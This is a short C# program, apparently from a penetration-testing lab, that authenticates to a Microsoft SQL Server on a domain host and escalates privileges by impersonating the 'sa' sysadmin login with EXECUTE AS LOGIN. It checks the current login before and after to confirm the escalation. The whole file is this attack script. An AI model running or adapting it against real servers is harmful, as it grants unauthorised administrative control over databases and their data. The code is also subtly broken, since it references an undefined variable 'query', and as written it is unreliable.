using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
       
        static void Main(string[] args)
        {
          String sqlServer = "dc01.corp1.com";
          
          //The default database in MS SQL is called “master”
          String database = "master";
          String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
          SqlConnection con = new SqlConnection(conString);
          
          try
          {
            con.Open();
            Console.WriteLine("Auth success!");
          }
          catch
          {
            Console.WriteLine("Auth failed");
            Environment.Exit(0);
          }
          String queryuser = "SELECT SYSTEM_USER;";
          Console.WriteLine("Before Impersonation");
          SqlCommand command = new SqlCommand(query, con);
          SqlDataReader reader = command.ExecuteReader();
          reader.Read();
          Console.WriteLine("Executing in the context of" + reader[0]);
          reader.Close();
          
          //impersonate sa user
          String executeas = "EXECUTE AS LOGIN = 'sa';";
          
          command = new SqlCommand(executeas, con);
          reader = command.ExecuteReader();
          reader.Close();
          
          //check my current running context
          Console.WriteLine("after impersonation");
          command = new SqlCommand(queryuser, con);
          reader = command.ExecuteReader();
          reader.Read();
          Console.WriteLine("Executing in the context of" + reader[0]);
          reader.Close();
    
        
          con.Close();         
          
        }
    }
}
